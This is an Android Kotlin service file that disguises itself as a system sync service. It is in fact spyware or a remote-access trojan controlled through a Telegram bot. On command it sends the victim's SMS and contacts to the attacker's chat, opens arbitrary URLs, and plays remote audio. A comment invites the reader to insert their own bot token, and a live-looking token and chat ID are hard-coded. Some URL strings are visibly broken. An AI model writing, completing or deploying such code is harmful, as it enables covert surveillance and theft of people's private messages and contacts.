package com.system.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.widget.Toast
import kotlinx.coroutines.*
import java.net.URL
import java.net.URLEncoder

class MainService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO)
    
    // !!! غير البيانات دي ببيانات البوت بتاعك !!!
    private val BOT_TOKEN = "8808280611:AAGIfoiMU15xLnFSQ3wNcf9SvHVMNHYTUFk"
    private val CHAT_ID = "5019050806"
    private var lastUpdateId = 0

    override fun onCreate() {
        super.onCreate()
        
        val channelId = "sys_sync"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(channelId, "Sync", NotificationManager.IMPORTANCE_MIN))
            val n = Notification.Builder(this, channelId).setContentTitle("System Syncing...").setSmallIcon(android.R.drawable.stat_notify_sync).build()
            startForeground(1, n)
        }

        scope.launch {
            while (isActive) {
                getUpdates()
                delay(5000)
            }
        }
    }

    private fun getUpdates() {
        try {
            val url = URL("https://api.telegram.org/bot\/getUpdates?offset=\&timeout=10")
            val response = url.readText()
            val jsonArray = org.json.JSONObject(response).getJSONArray("result")
            for (i in 0 until jsonArray.length()) {
                val update = jsonArray.getJSONObject(i)
                lastUpdateId = update.getInt("update_id") + 1
                if (update.has("message")) {
                    val text = update.getJSONObject("message").getString("text")
                    handleCommand(text)
                }
            }
        } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String) {
        when {
            cmd == "/info" -> sendMessage("Model: \\nAndroid: \")
            cmd == "/sms" -> sendMessage(SmsCollector.collect(this))
            cmd == "/contacts" -> sendMessage(ContactsCollector.collect(this))
            cmd.startsWith("/msg ") -> {
                val msg = cmd.replace("/msg ", "")
                Handler(Looper.getMainLooper()).post {
                    Toast.makeText(applicationContext, msg, Toast.LENGTH_LONG).show()
                }
            }
            cmd.startsWith("/url ") -> {
                val url = cmd.replace("/url ", "")
                val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url))
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }
            cmd.startsWith("/audio ") -> {
                val url = cmd.replace("/audio ", "")
                val mp = MediaPlayer()
                mp.setDataSource(url)
                mp.prepare()
                mp.start()
            }
        }
    }

    private fun sendMessage(msg: String) {
        try {
            val url = URL("https://api.telegram.org/bot\/sendMessage?chat_id=\&text=\")
            url.readText()
        } catch (_: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
